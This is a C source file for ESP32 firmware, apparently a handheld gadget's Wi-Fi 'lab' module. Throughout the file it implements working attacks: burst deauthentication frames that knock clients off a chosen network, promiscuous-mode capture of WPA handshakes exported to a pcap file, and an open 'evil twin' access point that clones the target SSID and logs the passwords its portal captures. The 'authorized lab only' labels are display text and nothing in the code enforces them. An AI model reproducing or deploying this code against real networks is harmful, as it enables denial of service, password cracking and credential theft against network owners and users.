#include "faculty175_wifi_lab.h"

#include <stdio.h>
#include <string.h>

#include "esp_log.h"
#include "esp_timer.h"
#include "esp_wifi.h"
#include "freertos/FreeRTOS.h"
#include "freertos/semphr.h"
#include "freertos/task.h"

#include "faculty175_util.h"
#include "faculty175_wifi_monitor.h"
#include "faculty175_wifi_settings.h"

static const char *TAG = "faculty175_wifi_lab";

#define DEAUTH_BURST 8
#define DEAUTH_INTERVAL_MS 250
#define HANDSHAKE_EAPOL0 0x88
#define HANDSHAKE_EAPOL1 0x8e
#define PCAP_FRAME_MAX 48
#define PCAP_PAYLOAD_MAX 512
#define PCAP_LINKTYPE_IEEE80211 105u

typedef struct {
    uint32_t ts_sec;
    uint32_t ts_usec;
    uint32_t incl_len;
    uint32_t orig_len;
} lab_pcap_rec_hdr_t;

typedef struct {
    uint32_t magic_number;
    uint16_t version_major;
    uint16_t version_minor;
    int32_t thiszone;
    uint32_t sigfigs;
    uint32_t snaplen;
    uint32_t network;
} lab_pcap_global_hdr_t;

typedef struct {
    uint32_t ts_us;
    uint16_t len;
    uint8_t data[PCAP_PAYLOAD_MAX];
} lab_pcap_frame_t;

typedef enum {
    LAB_MODE_NONE = 0,
    LAB_MODE_SCAN,
    LAB_MODE_DEAUTH,
    LAB_MODE_EVILTWIN,
    LAB_MODE_HANDSHAKE,
} lab_mode_t;

static SemaphoreHandle_t s_lock;
static lab_mode_t s_mode;
static faculty175_face_id_t s_face = FACULTY175_FACE_COUNT;
static faculty175_wifi_lab_state_t s_state;
static uint32_t s_last_deauth_ms;
static bool s_promiscuous;
static bool s_saved_ps;
static wifi_ps_type_t s_saved_ps_type = WIFI_PS_MIN_MODEM;
static bool s_evil_twin_ap;
static lab_pcap_frame_t s_pcap_frames[PCAP_FRAME_MAX];
static uint16_t s_pcap_count;
static uint16_t s_pcap_next;

static const uint8_t k_deauth_template[] = {
    0xc0, 0x00, 0x3a, 0x01, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff,
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
    0xf0, 0xff, 0x00, 0x00,
};

static esp_err_t ensure_lock(void);

static void lock_init(void)
{
    if (s_lock == NULL) {
        s_lock = xSemaphoreCreateMutex();
    }
}

static esp_err_t ensure_lock(void)
{
    lock_init();
    return s_lock != NULL ? ESP_OK : ESP_ERR_NO_MEM;
}

static void set_status_locked(const char *status, const char *detail)
{
    faculty175_strlcpy(s_state.status, status != NULL ? status : "", sizeof(s_state.status));
    faculty175_strlcpy(s_state.detail, detail != NULL ? detail : "", sizeof(s_state.detail));
}

static void sync_target_from_selection_locked(void)
{
    if (s_state.ap_count == 0) {
        s_state.target_ssid[0] = '\0';
        memset(s_state.target_bssid, 0, sizeof(s_state.target_bssid));
        s_state.target_channel = 0;
        return;
    }
    if (s_state.selected >= s_state.ap_count) {
        s_state.selected = 0;
    }
    const faculty175_wifi_lab_ap_t *ap = &s_state.aps[s_state.selected];
    faculty175_strlcpy(s_state.target_ssid, ap->ssid, sizeof(s_state.target_ssid));
    memcpy(s_state.target_bssid, ap->bssid, sizeof(s_state.target_bssid));
    s_state.target_channel = ap->channel;
}

static const char *auth_label(wifi_auth_mode_t auth)
{
    switch (auth) {
        case WIFI_AUTH_OPEN: return "open";
        case WIFI_AUTH_WEP: return "WEP";
        case WIFI_AUTH_WPA_PSK: return "WPA";
        case WIFI_AUTH_WPA2_PSK: return "WPA2";
        case WIFI_AUTH_WPA_WPA2_PSK: return "WPA/WPA2";
        case WIFI_AUTH_WPA3_PSK: return "WPA3";
        case WIFI_AUTH_WPA2_WPA3_PSK: return "WPA2/WPA3";
        default: return "other";
    }
}

static bool payload_has_eapol(const uint8_t *payload, int len)
{
    if (payload == NULL || len < 2) {
        return false;
    }
    for (int i = 0; i <= len - 2; ++i) {
        if (payload[i] == HANDSHAKE_EAPOL0 && payload[i + 1] == HANDSHAKE_EAPOL1) {
            return true;
        }
    }
    return false;
}

static void pcap_buffer_clear_locked(void)
{
    s_pcap_count = 0;
    s_pcap_next = 0;
    s_state.pcap_frames = 0;
    s_state.pcap_bytes = 0;
    s_state.pcap_path[0] = '\0';
}

static void pcap_store_frame_locked(const wifi_promiscuous_pkt_t *pkt, int len)
{
    if (pkt == NULL || len <= 0) {
        return;
    }
    if (len > PCAP_PAYLOAD_MAX) {
        len = PCAP_PAYLOAD_MAX;
    }
    lab_pcap_frame_t *slot = &s_pcap_frames[s_pcap_next];
    slot->ts_us = (uint32_t)(esp_timer_get_time());
    slot->len = (uint16_t)len;
    memcpy(slot->data, pkt->payload, (size_t)len);
    s_pcap_next = (uint16_t)((s_pcap_next + 1u) % PCAP_FRAME_MAX);
    if (s_pcap_count < PCAP_FRAME_MAX) {
        ++s_pcap_count;
    }
    s_state.pcap_frames = s_pcap_count;
}

static esp_err_t pcap_write_file_locked(void)
{
    if (s_pcap_count == 0) {
        return ESP_ERR_INVALID_STATE;
    }

    FILE *f = fopen(FACULTY175_WIFI_LAB_PCAP_PATH, "wb");
    if (f == NULL) {
        return ESP_FAIL;
    }

    const lab_pcap_global_hdr_t global = {
        .magic_number = 0xa1b2c3d4u,
        .version_major = 2,
        .version_minor = 4,
        .thiszone = 0,
        .sigfigs = 0,
        .snaplen = PCAP_PAYLOAD_MAX,
        .network = PCAP_LINKTYPE_IEEE80211,
    };
    if (fwrite(&global, sizeof(global), 1, f) != 1) {
        fclose(f);
        return ESP_FAIL;
    }

    uint32_t bytes = 0;
    const uint16_t start =
        s_pcap_count < PCAP_FRAME_MAX ? 0 : s_pcap_next;
    for (uint16_t i = 0; i < s_pcap_count; ++i) {
        const lab_pcap_frame_t *frame = &s_pcap_frames[(start + i) % PCAP_FRAME_MAX];
        const uint32_t sec = frame->ts_us / 1000000u;
        const uint32_t usec = frame->ts_us % 1000000u;
        const lab_pcap_rec_hdr_t rec = {
            .ts_sec = sec,
            .ts_usec = usec,
            .incl_len = frame->len,
            .orig_len = frame->len,
        };
        if (fwrite(&rec, sizeof(rec), 1, f) != 1 || fwrite(frame->data, 1, frame->len, f) != frame->len) {
            fclose(f);
            return ESP_FAIL;
        }
        bytes += (uint32_t)sizeof(rec) + frame->len;
    }
    fclose(f);

    s_state.pcap_bytes = bytes + (uint32_t)sizeof(global);
    faculty175_strlcpy(s_state.pcap_path, FACULTY175_WIFI_LAB_PCAP_PATH, sizeof(s_state.pcap_path));
    char detail[96];
    snprintf(detail,
             sizeof(detail),
             "%u frames %u bytes GET /lab/handshake.pcap",
             (unsigned)s_pcap_count,
             (unsigned)s_state.pcap_bytes);
    faculty175_wifi_monitor_record_note("handshake-pcap", detail);
    return ESP_OK;
}

esp_err_t faculty175_wifi_lab_export_pcap(void)
{
    if (ensure_lock() != ESP_OK) {
        return ESP_ERR_NO_MEM;
    }
    xSemaphoreTake(s_lock, portMAX_DELAY);
    const esp_err_t err = pcap_write_file_locked();
    if (err == ESP_OK) {
        char detail[64];
        snprintf(detail,
                 sizeof(detail),
                 "%u frames %uB",
                 (unsigned)s_state.pcap_frames,
                 (unsigned)s_state.pcap_bytes);
        set_status_locked("pcap saved", detail);
    }
    xSemaphoreGive(s_lock);
    return err;
}

static void promiscuous_cb(void *buf, wifi_promiscuous_pkt_type_t type)
{
    if (buf == NULL || s_mode != LAB_MODE_HANDSHAKE || !s_state.active) {
        return;
    }
    if (type != WIFI_PKT_MGMT && type != WIFI_PKT_DATA && type != WIFI_PKT_CTRL) {
        return;
    }
    const wifi_promiscuous_pkt_t *pkt = (const wifi_promiscuous_pkt_t *)buf;
    const int len = pkt->rx_ctrl.sig_len;
    if (len <= 0 || len > 512) {
        return;
    }
    if (!payload_has_eapol(pkt->payload, len)) {
        return;
    }
    lock_init();
    if (xSemaphoreTake(s_lock, 0) != pdTRUE) {
        return;
    }
    pcap_store_frame_locked(pkt, len);
    ++s_state.handshake_count;
    char detail[48];
    snprintf(detail, sizeof(detail), "eapol total=%lu ch=%u",
             (unsigned long)s_state.handshake_count, (unsigned)pkt->rx_ctrl.channel);
    set_status_locked("capturing", detail);
    faculty175_wifi_monitor_record_note("handshake-eapol", detail);
    xSemaphoreGive(s_lock);
}

static esp_err_t send_deauth_burst(void)
{
    if (s_state.target_bssid[0] == 0 && s_state.target_bssid[1] == 0 && s_state.target_bssid[2] == 0 &&
        s_state.target_bssid[3] == 0 && s_state.target_bssid[4] == 0 && s_state.target_bssid[5] == 0) {
        return ESP_ERR_INVALID_STATE;
    }
    if (s_state.target_channel != 0) {
        (void)esp_wifi_set_channel(s_state.target_channel, WIFI_SECOND_CHAN_NONE);
    }
    uint8_t frame[sizeof(k_deauth_template)];
    memcpy(frame, k_deauth_template, sizeof(frame));
    memcpy(frame + 10, s_state.target_bssid, 6);
    memcpy(frame + 16, s_state.target_bssid, 6);
    esp_err_t last = ESP_OK;
    for (int i = 0; i < DEAUTH_BURST; ++i) {
        const esp_err_t err = esp_wifi_80211_tx(WIFI_IF_STA, frame, sizeof(frame), false);
        if (err != ESP_OK) {
            last = err;
        } else {
            ++s_state.deauth_sent;
        }
    }
    return last;
}

static esp_err_t start_promiscuous(void)
{
    if (s_promiscuous) {
        return ESP_OK;
    }
    wifi_mode_t mode = WIFI_MODE_NULL;
    (void)esp_wifi_get_mode(&mode);
    if (mode == WIFI_MODE_AP) {
        (void)esp_wifi_set_mode(WIFI_MODE_APSTA);
    } else if (mode == WIFI_MODE_NULL) {
        (void)esp_wifi_set_mode(WIFI_MODE_STA);
        (void)esp_wifi_start();
    }
    (void)esp_wifi_set_ps(WIFI_PS_NONE);
    esp_err_t err = esp_wifi_set_promiscuous(true);
    if (err == ESP_OK) {
        err = esp_wifi_set_promiscuous_rx_cb(promiscuous_cb);
    }
    if (err == ESP_OK) {
        s_promiscuous = true;
    }
    return err;
}

static void stop_promiscuous(void)
{
    if (!s_promiscuous) {
        return;
    }
    (void)esp_wifi_set_promiscuous_rx_cb(NULL);
    (void)esp_wifi_set_promiscuous(false);
    s_promiscuous = false;
    if (s_saved_ps) {
        (void)esp_wifi_set_ps(s_saved_ps_type);
        s_saved_ps = false;
    }
}

static esp_err_t start_evil_twin(void)
{
    if (s_state.target_ssid[0] == '\0') {
        return ESP_ERR_INVALID_STATE;
    }
    wifi_config_t ap = {};
    faculty175_strlcpy((char *)ap.ap.ssid, s_state.target_ssid, sizeof(ap.ap.ssid));
    ap.ap.ssid_len = (uint8_t)strlen((const char *)ap.ap.ssid);
    ap.ap.channel = s_state.target_channel != 0 ? s_state.target_channel : 6;
    ap.ap.max_connection = 4;
    ap.ap.authmode = WIFI_AUTH_OPEN;
    ap.ap.pmf_cfg.required = false;
    esp_err_t err = esp_wifi_set_mode(WIFI_MODE_AP);
    if (err == ESP_OK) {
        err = esp_wifi_set_config(WIFI_IF_AP, &ap);
    }
    if (err == ESP_OK) {
        err = esp_wifi_start();
    }
    if (err == ESP_OK) {
        s_evil_twin_ap = true;
        char detail[64];
        snprintf(detail, sizeof(detail), "ssid=\"%s\" ch=%u portal=/lab/portal",
                 s_state.target_ssid, (unsigned)ap.ap.channel);
        faculty175_wifi_monitor_record_note("evil-twin", detail);
    }
    return err;
}

static void stop_evil_twin(void)
{
    if (!s_evil_twin_ap) {
        return;
    }
    s_evil_twin_ap = false;
    (void)esp_wifi_stop();
}

static void stop_active_locked(void)
{
    if (s_mode == LAB_MODE_DEAUTH) {
        s_state.active = false;
        set_status_locked("idle", "deauth stopped");
    } else if (s_mode == LAB_MODE_HANDSHAKE) {
        s_state.active = false;
        stop_promiscuous();
        if (s_pcap_count > 0) {
            (void)pcap_write_file_locked();
            set_status_locked("pcap saved", s_state.pcap_path);
        } else {
            set_status_locked("idle", "handshake capture stopped");
        }
    } else if (s_mode == LAB_MODE_EVILTWIN) {
        s_state.active = false;
        stop_evil_twin();
        set_status_locked("idle", "evil twin stopped");
    }
    s_state.busy = false;
}

bool faculty175_wifi_lab_is_face(faculty175_face_id_t id)
{
    return id == FACULTY175_FACE_WSCAN || id == FACULTY175_FACE_DEAUTH || id == FACULTY175_FACE_EVILTWIN ||
           id == FACULTY175_FACE_HANDSHAKE;
}

void faculty175_wifi_lab_get_state(faculty175_wifi_lab_state_t *out)
{
    if (out == NULL) {
        return;
    }
    lock_init();
    if (s_lock != NULL) {
        xSemaphoreTake(s_lock, portMAX_DELAY);
    }
    *out = s_state;
    if (s_lock != NULL) {
        xSemaphoreGive(s_lock);
    }
}

void faculty175_wifi_lab_record_capture(const char *ssid, const char *pass)
{
    if (ensure_lock() != ESP_OK) {
        return;
    }
    xSemaphoreTake(s_lock, portMAX_DELAY);
    ++s_state.capture_count;
    char detail[FACULTY175_WIFI_LAB_CRED_MAX];
    snprintf(detail, sizeof(detail), "%s / %s", ssid != NULL ? ssid : "?", pass != NULL ? pass : "?");
    faculty175_strlcpy(s_state.last_cred, detail, sizeof(s_state.last_cred));
    set_status_locked("capture", detail);
    faculty175_wifi_monitor_record_note("evil-twin-cred", detail);
    xSemaphoreGive(s_lock);
}

esp_err_t faculty175_wifi_lab_set_target_index(uint8_t index)
{
    if (ensure_lock() != ESP_OK) {
        return ESP_ERR_NO_MEM;
    }
    xSemaphoreTake(s_lock, portMAX_DELAY);
    if (index >= s_state.ap_count) {
        xSemaphoreGive(s_lock);
        return ESP_ERR_INVALID_ARG;
    }
    s_state.selected = index;
    sync_target_from_selection_locked();
    char detail[64];
    snprintf(detail, sizeof(detail), "%s ch=%u %s",
             s_state.target_ssid,
             (unsigned)s_state.target_channel,
             auth_label(s_state.aps[s_state.selected].authmode));
    set_status_locked("target", detail);
    xSemaphoreGive(s_lock);
    return ESP_OK;
}

esp_err_t faculty175_wifi_lab_scan(void)
{
    if (ensure_lock() != ESP_OK) {
        return ESP_ERR_NO_MEM;
    }
    xSemaphoreTake(s_lock, portMAX_DELAY);
    s_state.busy = true;
    set_status_locked("scanning", "2.4 GHz sweep");
    xSemaphoreGive(s_lock);

    faculty175_wifi_settings_set_scan_suppressed(true);
    wifi_mode_t mode = WIFI_MODE_NULL;
    (void)esp_wifi_get_mode(&mode);
    if (mode == WIFI_MODE_AP) {
        (void)esp_wifi_set_mode(WIFI_MODE_APSTA);
    }
    (void)esp_wifi_disconnect();
    vTaskDelay(pdMS_TO_TICKS(200));
    wifi_scan_config_t scan = {
        .show_hidden = true,
    };
    esp_err_t err = esp_wifi_scan_start(&scan, true);
    if (err != ESP_OK) {
        faculty175_wifi_settings_set_scan_suppressed(false);
        xSemaphoreTake(s_lock, portMAX_DELAY);
        s_state.busy = false;
        set_status_locked("scan failed", esp_err_to_name(err));
        xSemaphoreGive(s_lock);
        return err;
    }
    uint16_t count = 0;
    err = esp_wifi_scan_get_ap_num(&count);
    if (err != ESP_OK) {
        faculty175_wifi_settings_set_scan_suppressed(false);
        xSemaphoreTake(s_lock, portMAX_DELAY);
        s_state.busy = false;
        set_status_locked("scan failed", esp_err_to_name(err));
        xSemaphoreGive(s_lock);
        return err;
    }
    if (count > FACULTY175_WIFI_LAB_AP_MAX) {
        count = FACULTY175_WIFI_LAB_AP_MAX;
    }
    wifi_ap_record_t records[FACULTY175_WIFI_LAB_AP_MAX] = {};
    err = esp_wifi_scan_get_ap_records(&count, records);
    faculty175_wifi_settings_set_scan_suppressed(false);

    xSemaphoreTake(s_lock, portMAX_DELAY);
    s_state.ap_count = 0;
    if (err == ESP_OK) {
        for (uint16_t i = 0; i < count; ++i) {
            faculty175_wifi_lab_ap_t *ap = &s_state.aps[s_state.ap_count];
            faculty175_strlcpy(ap->ssid, (const char *)records[i].ssid, sizeof(ap->ssid));
            memcpy(ap->bssid, records[i].bssid, sizeof(ap->bssid));
            ap->rssi = records[i].rssi;
            ap->channel = records[i].primary;
            ap->authmode = records[i].authmode;
            ++s_state.ap_count;
        }
    }
    sync_target_from_selection_locked();
    s_state.busy = false;
    char detail[48];
    snprintf(detail, sizeof(detail), "found %u networks", (unsigned)s_state.ap_count);
    set_status_locked(err == ESP_OK ? "scan done" : "scan failed", err == ESP_OK ? detail : esp_err_to_name(err));
    xSemaphoreGive(s_lock);

    if (err == ESP_OK) {
        faculty175_wifi_monitor_record_scan(s_state.ap_count);
    }
    return err;
}

void faculty175_wifi_lab_on_enter(faculty175_face_id_t id)
{
    if (!faculty175_wifi_lab_is_face(id)) {
        return;
    }
    if (ensure_lock() != ESP_OK) {
        return;
    }
    xSemaphoreTake(s_lock, portMAX_DELAY);
    s_face = id;
    if (id == FACULTY175_FACE_WSCAN) {
        s_mode = LAB_MODE_SCAN;
        set_status_locked("ready", "tap to scan");
    } else if (id == FACULTY175_FACE_DEAUTH) {
        s_mode = LAB_MODE_DEAUTH;
        set_status_locked("authorized lab only", "tap target then start");
    } else if (id == FACULTY175_FACE_EVILTWIN) {
        s_mode = LAB_MODE_EVILTWIN;
        set_status_locked("authorized lab only", "tap to start/stop twin");
    } else if (id == FACULTY175_FACE_HANDSHAKE) {
        s_mode = LAB_MODE_HANDSHAKE;
        set_status_locked("authorized lab only", "tap to start/stop capture");
    }
    sync_target_from_selection_locked();
    xSemaphoreGive(s_lock);
}

void faculty175_wifi_lab_on_leave(faculty175_face_id_t id)
{
    (void)id;
    if (ensure_lock() != ESP_OK) {
        return;
    }
    xSemaphoreTake(s_lock, portMAX_DELAY);
    stop_active_locked();
    s_mode = LAB_MODE_NONE;
    s_face = FACULTY175_FACE_COUNT;
    xSemaphoreGive(s_lock);
}

void faculty175_wifi_lab_tick(faculty175_face_id_t id, uint32_t now_ms)
{
    if (!faculty175_wifi_lab_is_face(id) || ensure_lock() != ESP_OK) {
        return;
    }
    xSemaphoreTake(s_lock, portMAX_DELAY);
    if (s_mode == LAB_MODE_DEAUTH && s_state.active &&
        now_ms - s_last_deauth_ms >= DEAUTH_INTERVAL_MS) {
        const esp_err_t err = send_deauth_burst();
        s_last_deauth_ms = now_ms;
        char detail[64];
        snprintf(detail, sizeof(detail), "sent=%lu target=%s",
                 (unsigned long)s_state.deauth_sent,
                 s_state.target_ssid[0] != '\0' ? s_state.target_ssid : "(none)");
        set_status_locked(err == ESP_OK ? "deauthing" : "deauth err", detail);
        if (err != ESP_OK) {
            ESP_LOGW(TAG, "deauth tx failed: %s", esp_err_to_name(err));
        }
    }
    xSemaphoreGive(s_lock);
}

bool faculty175_wifi_lab_cycle_target(faculty175_face_id_t id, int delta)
{
    if (!faculty175_wifi_lab_is_face(id) || id == FACULTY175_FACE_WSCAN || delta == 0 || ensure_lock() != ESP_OK) {
        return false;
    }
    xSemaphoreTake(s_lock, portMAX_DELAY);
    if (s_state.ap_count == 0) {
        xSemaphoreGive(s_lock);
        return false;
    }
    int next = (int)s_state.selected + (delta > 0 ? 1 : -1);
    if (next < 0) {
        next = (int)s_state.ap_count - 1;
    } else if (next >= (int)s_state.ap_count) {
        next = 0;
    }
    s_state.selected = (uint8_t)next;
    sync_target_from_selection_locked();
    char detail[64];
    snprintf(detail, sizeof(detail), "%s ch=%u %s",
             s_state.target_ssid,
             (unsigned)s_state.target_channel,
             auth_label(s_state.aps[s_state.selected].authmode));
    set_status_locked("target", detail);
    xSemaphoreGive(s_lock);
    return true;
}

bool faculty175_wifi_lab_tap(faculty175_face_id_t id)
{
    if (!faculty175_wifi_lab_is_face(id) || ensure_lock() != ESP_OK) {
        return false;
    }

    if (id == FACULTY175_FACE_WSCAN) {
        const esp_err_t err = faculty175_wifi_lab_scan();
        return err == ESP_OK;
    }

    xSemaphoreTake(s_lock, portMAX_DELAY);
    sync_target_from_selection_locked();
    if (s_state.target_ssid[0] == '\0' && id != FACULTY175_FACE_WSCAN) {
        set_status_locked("no target", "run WiFi Scan first");
        xSemaphoreGive(s_lock);
        return true;
    }

    if (id == FACULTY175_FACE_DEAUTH) {
        if (s_state.active) {
            stop_active_locked();
        } else {
            if (!s_saved_ps) {
                (void)esp_wifi_get_ps(&s_saved_ps_type);
                s_saved_ps = true;
            }
            (void)esp_wifi_set_ps(WIFI_PS_NONE);
            s_state.active = true;
            s_last_deauth_ms = 0;
            set_status_locked("deauthing", s_state.target_ssid);
            faculty175_wifi_monitor_record_note("deauth-start", s_state.target_ssid);
        }
        xSemaphoreGive(s_lock);
        return true;
    }

    if (id == FACULTY175_FACE_HANDSHAKE) {
        if (s_state.active) {
            stop_active_locked();
        } else {
            if (s_state.target_channel != 0) {
                (void)esp_wifi_set_channel(s_state.target_channel, WIFI_SECOND_CHAN_NONE);
            }
            const esp_err_t err = start_promiscuous();
            if (err == ESP_OK) {
                s_state.active = true;
                s_state.handshake_count = 0;
                pcap_buffer_clear_locked();
                set_status_locked("capturing", s_state.target_ssid);
                faculty175_wifi_monitor_record_note("handshake-start", s_state.target_ssid);
            } else {
                set_status_locked("capture failed", esp_err_to_name(err));
            }
        }
        xSemaphoreGive(s_lock);
        return true;
    }

    if (id == FACULTY175_FACE_EVILTWIN) {
        if (s_state.active) {
            stop_active_locked();
        } else {
            const esp_err_t err = start_evil_twin();
            if (err == ESP_OK) {
                s_state.active = true;
                set_status_locked("evil twin live", s_state.target_ssid);
            } else {
                set_status_locked("twin failed", esp_err_to_name(err));
            }
        }
        xSemaphoreGive(s_lock);
        return true;
    }

    xSemaphoreGive(s_lock);
    return false;
}
